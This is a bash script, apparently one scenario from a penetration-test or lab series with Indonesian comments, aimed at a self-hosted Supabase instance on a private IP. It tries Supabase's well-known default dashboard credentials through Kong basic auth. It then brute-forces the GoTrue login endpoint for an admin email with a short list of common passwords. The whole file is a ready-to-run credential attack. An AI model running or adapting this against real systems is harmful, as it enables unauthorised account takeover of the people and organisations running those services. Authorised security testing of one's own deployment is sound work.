#!/bin/bash
# S3 - Default credential & brute force
TARGET="${1:-172.16.6.10}"
ANON="${ANON_KEY:?set ANON_KEY dulu, mis: source ./env.sh}"
echo "==================================================="
echo " S3  DEFAULT CREDENTIAL / BRUTE FORCE  ->  $TARGET"
echo "==================================================="
echo "--- Coba kredensial default dashboard (basic auth via Kong) ---"
curl -s -o /dev/null -w "  supabase:this_password_is_insecure... -> HTTP %{http_code}\n" \
  -u "supabase:this_password_is_insecure_and_should_be_updated" "http://$TARGET:8000/"
echo "--- Brute force kecil ke endpoint login GoTrue ---"
for p in admin password 123456 supabase rahasia qwerty; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://$TARGET:8000/auth/v1/token?grant_type=password" \
    -H "apikey: $ANON" -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@sahirafarm.id\",\"password\":\"$p\"}")
  echo "  coba password '$p' -> HTTP $code"
done
